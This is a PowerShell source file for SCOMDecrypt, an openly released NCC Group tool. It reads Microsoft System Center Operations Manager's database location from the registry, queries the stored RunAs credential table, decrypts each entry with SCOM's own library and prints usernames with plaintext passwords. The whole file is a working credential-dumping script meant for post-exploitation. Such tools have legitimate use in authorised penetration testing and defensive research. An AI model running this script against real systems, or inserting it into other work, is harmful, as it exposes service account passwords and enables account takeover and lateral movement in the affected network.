<#
Released as open source by NCC Group Plc - http://www.nccgroup.com/

Developed by Richard Warren, richard dot warren at nccgroup dot trust

https://www.github.com/nccgroup/SCOMDecrypt

Released under AGPL see LICENSE for more information
#>



function Invoke-SCOMDecrypt {
	[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.Mom.Sdk.SecureStorageManager.dll") | Out-Null
	[System.Reflection.Assembly]::LoadFile("C:\Program Files\Microsoft System Center 2012 R2\Operations Manager\Server\Microsoft.EnterpriseManagement.DataAccessLayer.dll") | Out-Null
	$scom = New-Object Microsoft.EnterpriseManagement.Security.SecureStorageManager

	$reg = Get-ItemProperty "hklm:SOFTWARE\Microsoft\System Center\2010\Common\Database"
	$server = $reg.DatabaseServerName
	$database = $reg.DatabaseName
	$sqlCommand = "SELECT UserName, Data FROM dbo.CredentialManagerSecureStorage;"
	$connectionString = "Server=$server;Database=$database;Trusted_Connection=True;"
	$connection = new-object system.data.SqlClient.SQLConnection($connectionString)
	$command = new-object system.data.sqlclient.sqlcommand($sqlCommand,$connection)
	$connection.Open()
	$adapter = New-Object System.Data.sqlclient.sqlDataAdapter $command
	$dataset = New-Object System.Data.DataSet
	$adapter.Fill($dataSet) | Out-Null
	$connection.Close()
	
	for($i=0;$i -lt $dataset.Tables[0].Rows.Count;$i++)
	{ 
	if($dataset.Tables[0].Rows[$i].Data -ne [System.DBNull]::Value -and $dataset.Tables[0].Rows[$i].Username -ne [System.DBNull]::Value)
		{
		$passw = [System.Text.Encoding]::UTF8.GetString($scom.Decrypt($dataset.Tables[0].Rows[$i].Data))
		$user = $dataset.Tables[0].Rows[$i].Username
		Write-Host "[+] $user : $passw"
		}
	}
}